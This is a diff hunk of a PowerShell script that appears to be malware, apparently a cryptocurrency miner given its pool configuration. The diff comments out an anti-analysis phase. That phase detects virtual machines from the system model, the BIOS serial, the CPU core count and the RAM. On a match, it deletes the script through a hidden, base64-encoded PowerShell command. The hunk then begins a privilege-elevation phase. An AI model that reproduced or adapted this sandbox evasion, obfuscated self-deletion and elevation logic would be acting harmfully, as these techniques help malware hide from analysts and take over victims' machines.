@@ -17,28 +17,28 @@ $poolConfig = @{
 }
 
 ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
-$isVM = $false
-$vmIndicators = @{
-    SystemModel = (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V"
-    BIOSSerial = (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|Xen|Virtual"
-    LowCores = (Get-WmiObject Win32_Processor).NumberOfCores -lt 2
-    LowRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4
-}
+# $isVM = $false
+# $vmIndicators = @{
+#     SystemModel = (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V"
+#     BIOSSerial = (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|Xen|Virtual"
+#     LowCores = (Get-WmiObject Win32_Processor).NumberOfCores -lt 2
+#     LowRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4
+# }
 
-if ($vmIndicators.Values -contains $true) {
-    # Self-destruct sequence
-    $selfDestruct = @"
-    Start-Sleep -Seconds 5
-    Remove-Item -Path '$PSCommandPath' -Force -ErrorAction SilentlyContinue
-    if (Test-Path '$PSCommandPath') {
-        attrib -h -s '$PSCommandPath'
-        Remove-Item -Path '$PSCommandPath' -Force
-    }
-"@
-    $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($selfDestruct))
-    Start-Process powershell -ArgumentList "-EncodedCommand $encodedCmd" -WindowStyle Hidden
-    exit
-}
+# if ($vmIndicators.Values -contains $true) {
+#     # Self-destruct sequence
+#     $selfDestruct = @"
+#     Start-Sleep -Seconds 5
+#     Remove-Item -Path '$PSCommandPath' -Force -ErrorAction SilentlyContinue
+#     if (Test-Path '$PSCommandPath') {
+#         attrib -h -s '$PSCommandPath'
+#         Remove-Item -Path '$PSCommandPath' -Force
+#     }
+# "@
+#     $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($selfDestruct))
+#     Start-Process powershell -ArgumentList "-EncodedCommand $encodedCmd" -WindowStyle Hidden
+#     exit
+# }
 
 ### === PHASE 2: ELEVATION MECHANISM ===
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
